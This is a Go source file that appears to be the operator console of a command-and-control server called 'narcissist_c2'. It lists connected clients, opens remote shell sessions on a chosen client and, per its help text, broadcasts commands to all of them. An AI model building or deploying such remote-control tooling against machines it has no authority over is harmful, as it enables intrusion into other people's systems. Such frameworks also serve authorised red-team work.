package components

import (
	"bufio"
	"context"
	"fmt"
	"narcissist_c2/server/structs"
	"narcissist_c2/server/utils"
	"os"
	"strconv"
	"strings"
)

var strInput string
var IptDataCh = make(chan string)

func GetStrIpt() string {
	return strInput
}

var ctx context.Context
var cancel context.CancelFunc
var mode string = "normal" // Modes can be "normal" or "shell"

func HandleInput() {
	strInput = "listener🛰️narcissist_c2 " + utils.GetEmoji("setting")
	scanner := bufio.NewScanner(os.Stdin)
	var shellSessionFunc func(string)

	for {
		if mode == "normal" {
			fmt.Print(GetStrIpt())
		}

		if !scanner.Scan() {
			fmt.Println("Input closed")
			return
		}
		input := scanner.Text()
		//fmt.Println(mode)
		switch mode {
		case "normal":
			interpreter(input, &mode, &shellSessionFunc)
		case "shell":
			if input == "exit" {
				mode = "normal"
				break
			}
			IptDataCh <- input

		}
	}
}

func interpreter(cmd string, mode *string, shellSessionFunc *func(string)) {
	args := strings.Fields(cmd)
	if len(args) == 0 {
		return
	}

	switch args[0] {
	case "help":
		help()
	case "list":
		listClients(Clients, true)
	case "focus":
		if len(args) < 2 {
			fmt.Println("Usage: focus <client-id>")
			return
		}
		clientID, err := strconv.Atoi(args[1])
		if err != nil {
			fmt.Println("Invalid client ID")
			return
		}
		fmt.Println(utils.GetEmoji("info") + "Starting shell session.")
		fmt.Println(utils.GetEmoji("help") + "Tip: type 'exit' to quit the session")
		*mode = "shell"
		createShellSession(clientID, mode, shellSessionFunc)
	case "defocus":
		*mode = "normal"
		*shellSessionFunc = nil
		fmt.Println("Exited shell session")
	default:
		fmt.Println("Unknown command")
	}
}

func help() {
	fmt.Println(utils.GetEmoji("help") + "Sure ! Here is a list of available commands:")
	fmt.Println("     " + utils.GetEmoji("setting") + "exit : exit c2")
	fmt.Println("     " + utils.GetEmoji("setting") + "list : get a list of connected clients")
	fmt.Println("     " + utils.GetEmoji("setting") + "focus <client-id> : focus on a specific client")
	fmt.Println("     " + utils.GetEmoji("setting") + "defocus : exit focusing")
	fmt.Println("     " + utils.GetEmoji("setting") + "cmd <command> : send a single command in broadcast")

}

func listClients(clients map[int]structs.Client, listAll bool) {
	if len(clients) == 0 {
		fmt.Println(utils.GetEmoji("not ok") + "No clients connected")
		return
	}
	if !listAll {
		fmt.Println(utils.GetEmoji("user") + "" + strconv.Itoa(len(clients)) + " clients connected")
		return
	}

	fmt.Println(utils.GetEmoji("loading") + "Listing " + strconv.Itoa(len(clients)) + " clients...")
	for _, client := range clients {
		fmt.Println("  " + utils.GetEmoji("user") + strconv.Itoa(client.ID) + " " + client.Address)
	}

}

func GetChValue(chans chan bool) bool {
	ch := <-chans
	return ch
}
